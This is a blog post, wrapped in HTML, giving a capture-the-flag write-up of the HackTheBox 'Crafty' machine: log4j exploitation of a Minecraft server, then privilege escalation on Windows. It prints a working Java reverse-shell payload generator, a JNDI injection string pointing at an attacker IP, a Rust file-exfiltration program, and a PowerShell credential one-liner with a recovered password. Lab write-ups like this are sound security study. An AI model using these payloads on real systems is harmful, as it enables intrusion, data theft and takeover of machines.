@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HackTheBox -- Crafty -- WriteUp :: Thotty</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="This is a write-up about my journey to obtain user and root on the Crafty box. " />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/writeups/crafty/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/orange.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HackTheBox -- Crafty -- WriteUp">
+<meta property="og:description" content="This is a write-up about my journey to obtain user and root on the Crafty box. " />
+<meta property="og:url" content="/writeups/crafty/" />
+<meta property="og:site_name" content="Thotty" />
+
+  
+    <meta property="og:image" content="/img/favicon/orange.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="orange">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    ThottySploity
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/writeups">Write-ups</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/writeups" >Write-ups</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/writeups/crafty/">HackTheBox &ndash; Crafty &ndash; WriteUp</a>
+  </h1>
+  <div class="post-meta"></div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="1-reconnaissance"><code>1</code> Reconnaissance<a href="#1-reconnaissance" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>To start the pentest off, we firstly start with some active recon. We start a nmap using the following parameters: <code>nmap -T4 -sV -Pn -p- 10.10.11.249</code>
+
+<img src="/img/nmap_crafty.png"  alt="Nmap Crafty"  class="center"  style="border-radius: 8px;"    />
+
+</p>
+<p>The results are.. interesting, we firstly see a webserver and a <code>Minecraft</code> server. When seeing the Minecraft server I instantly thought of <code>log4j</code> since this was a huge deal back in the good &lsquo;ol times, nearly everything that used java was vulnerable. Fun times.</p>
+<p>I decided to blindsight the webserver for a bit and focus on the, very outdated, Minecraft server.</p>
+<h1 id="2-weaponization"><code>2</code> Weaponization<a href="#2-weaponization" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Since writing a log4j exploit by myself seemed silly, as the exploit is already three years old, I decided to browse the internet a bit. I came across this repo <code>https://github.com/kozmer/log4j-shell-poc</code>. Which fit my needs nearly perfectly.</p>
+<p>The code needed a little bit of a change as the <code>cmd</code> string to spawn an executor for us was set to <code>/bin/sh</code> which wouldn&rsquo;t have worked as Crafty is a Windows box. It&rsquo;s a Windows box which can be concluded from the OS guess of nmap but an even bigger indicator is Microsoft IIS httpd which is used as a webserver.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="1" type="checkbox"  />
+    <label for="1">
+      <span class="collapsable-code__language">python</span>
+      <span class="collapsable-code__title">log4j exploit</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-python" ><code>
+	def generate_payload(userip: str, lport: int) -&gt; None:
+	    program = &#34;&#34;&#34;
+		import java.io.IOException;
+		import java.io.InputStream;
+		import java.io.OutputStream;
+		import java.net.Socket;
+
+		public class Exploit {
+
+		    public Exploit() throws Exception {
+			String host=&#34;%s&#34;;
+			int port=%d;
+			String cmd=&#34;cmd.exe&#34;;
+			Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+			Socket s=new Socket(host,port);
+			InputStream pi=p.getInputStream(),
+			    pe=p.getErrorStream(),
+			    si=s.getInputStream();
+			OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+			while(!s.isClosed()) {
+			    while(pi.available()&gt;0)
+				so.write(pi.read());
+			    while(pe.available()&gt;0)
+				so.write(pe.read());
+			    while(si.available()&gt;0)
+				po.write(si.read());
+			    so.flush();
+			    po.flush();
+			    Thread.sleep(50);
+			    try {
+				p.exitValue();
+				break;
+			    }
+			    catch (Exception e){
+			    }
+			};
+			p.destroy();
+			s.close();
+		    }
+		}
+		&#34;&#34;&#34; % (userip, lport)
+
+		    # writing the exploit to Exploit.java file
+
+		    p = Path(&#34;Exploit.java&#34;)
+
+		    try:
+			p.write_text(program)
+			subprocess.run([os.path.join(CUR_FOLDER, &#34;jdk1.8.0_20/bin/javac&#34;), str(p)])
+		    except OSError as e:
+			print(Fore.RED &#43; f&#39;[-] Something went wrong {e}&#39;)
+			raise e
+		    else:
+			print(Fore.GREEN &#43; &#39;[&#43;] Exploit java class created success&#39;)
+</code></pre>
+  </div>
+
+
+<h1 id="3-delivery--exploitation--installation--command-and-control"><code>3</code> Delivery &amp; Exploitation &amp; Installation &amp; Command and Control<a href="#3-delivery--exploitation--installation--command-and-control" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>To deliver and exploit the log4j exploit we need three things. Firstly we need to install our own Minecraft client and join the server, then we need to run the Proof-of-Concept of the log4j exploit since this is where the server will reach out to and lastly we need to start a seperate listener so the server can connect back to us.</p>
+
+<img src="/img/b4exploit.png"  alt="Log4j prepare Crafty"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>After joining the server, we need to paste the <code>${jndi:ldap://10.10.16.85:1389/a}</code> into the server chat. Once we press enter, we will receive a connection from the server back.</p>
+
+<img src="/img/duringlog4j.png"  alt="Log4j Exploit Crafty"  class="center"  style="border-radius: 8px;"    />
+
+
+<h1 id="4-actions-on-objective"><code>4</code> Actions on Objective<a href="#4-actions-on-objective" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>We now have access to the user of the box. When we move to <code>C:\Users\svc_minecraft\Desktop</code> we can get the user flag. Ofcourse I cannot show the full flag as that would ruin the fun :)</p>
+
+<img src="/img/crafty_userflag.png"  alt="userflag Crafty"  class="center"  style="border-radius: 8px;"    />
+
+
+<h1 id="41-privilege-escalation"><code>4.1</code> Privilege Escalation<a href="#41-privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>User access is great, but we can go a step further essentially <code>rooting</code> the box. To kickoff privilege escalation I first decided to check the access this account had by checking it&rsquo;s current privileges and group membership.</p>
+
+<img src="/img/crafty_whoamiall.png"  alt="userflag Crafty"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>Ofcourse I also had to check what useraccounts are currently in the administrator localgroup</p>
+
+<img src="/img/netlocalgroupadministrator_crafty.png"  alt="local admin Crafty"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>Welp, nothing too obvious I could exploit, the next step was to run <code>winPEAS.exe</code> and see if that would give anything note worthy.</p>
+<p><code>winPEAS.exe</code> gave nothing note worthy back, no unqouted service paths that I could edit and no lingering password files. In a small conclusion nothing really stood out to me. I decided to enumerate further with focus on the minecraft server, and doing so ended up in the plugins folder.</p>
+
+<img src="/img/pluginscrafty.png"  alt="plugins Crafty"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>Odly enough there was only one plugin <code>playercounter-1.0-SNAPSHOT.jar</code> which grabbed my attention. Next I need to figure out how to exfiltrate this plugin to decompile it.</p>
+<p>After failing horribly thrice to just POST the file to my attackbox using all kinds of weird Powershell MumboJumbo, I decided to just do what I know. I wrote a very ~shitty~ Rust executable to just exfiltrate the file for me.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="1" type="checkbox"  />
+    <label for="1">
+      <span class="collapsable-code__language">Rust</span>
+      <span class="collapsable-code__title">Plugin exfiltrate</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-Rust" ><code>
+	use std::net::TcpStream;
+	use std::io::Read;
+	use std::io::Write;
+
+	fn main() {
+	    println!(&#34;Hello, world!&#34;);
+
+	    if let Ok(mut stream) = TcpStream::connect(&#34;10.10.16.85:1337&#34;) {
+			if let Ok(mut file) = std::fs::File::open(&#34;C:\\Users\\svc_minecraft\\server\\plugins\\playercounter-1.0-SNAPSHOT.jar&#34;) {
+		    	let mut buffer: Vec&lt;u8&gt; = Vec::new();
+
+		    	if let Ok(_) = file.read_to_end(&amp;mut buffer) {
+					stream.write_all(&amp;buffer);
+			   }
+	    	}
+	     }
+	}
+
+</code></pre>
+  </div>
+
+
+<p>I started up netcat with port <code>1337</code> uploaded this executable to Crafty and ran it.</p>
+
+<img src="/img/customexfil.png"  alt="Exfil Crafty"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>Now it was time to decompile the java file, for this I used <code>jd-gui</code> which decompiled java and shows it in a nice GUI. What was found in the PlayerCounter class was an encoded base64 string that looked like a password. When I found this I was over the moon, as winpeas didn&rsquo;t result in an actionable Priv Esc vector.</p>
+
+<img src="/img/jd-gui.png"  alt="JdGui Crafty"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>When I tried decoding this Base64 string I got garbage, so I knew from this point it was encrypted. Luckily Powershell can deal with these kinds of passwords.
+Firstly I made a simple Powershell reverse shell that was linked to nc port <code>4446</code>. I then uploaded this <code>.ps1</code> script file to the target.</p>
+
+<img src="/img/simplePSshell_crafty.png"  alt="Powershell Crafty"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>Combining the password found in the plugin, I made a powershell oneliner that creates the credentials using Administrator as it&rsquo;s username and the recovered base64 encoded string as the password. Next I passed the <code>backup.ps1</code> as an argument.</p>
+<p><code>$credentials = New-Object System.Management.Automation.PSCredential -ArgumentList @(&quot;Administrator&quot;, ConvertTo-SecureString -String &quot;s67u84zKq8IXw&quot; -AsPlainText -Force)); Start-Process powershell.exe -Credential $credentials -ArgumentList &quot;-file C:\users\svc_minecraft\Desktop\backup.ps1&quot;</code></p>
+
+<img src="/img/crafty_admin.png"  alt="Admin Crafty"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>Last thing to do is move to <code>C:\Users\Administrator\Desktop</code> and get the root.txt</p>
+
+<img src="/img/crafty_rootflag.png"  alt="Root Crafty"  class="center"  style="border-radius: 8px;"    />
+
+
+<h1 id="5-conclusion"><code>5</code> Conclusion<a href="#5-conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>The Crafty box was a fun time, allthough marked as an easy box I experienced the rooting of it not as such. Getting a foothold into the box was a piece of cake and took me roughly five minutes, mostly because I focussed fully on the outdated Minecraft server as my way in.</p>
+<p>The escalation of privileges wasn&rsquo;t as straight forward as I would&rsquo;ve expected, and somehow I doubt its real-world application. Nonetheless it was a fun box and have learned to <code>try harder</code>.</p>
+
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2024 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
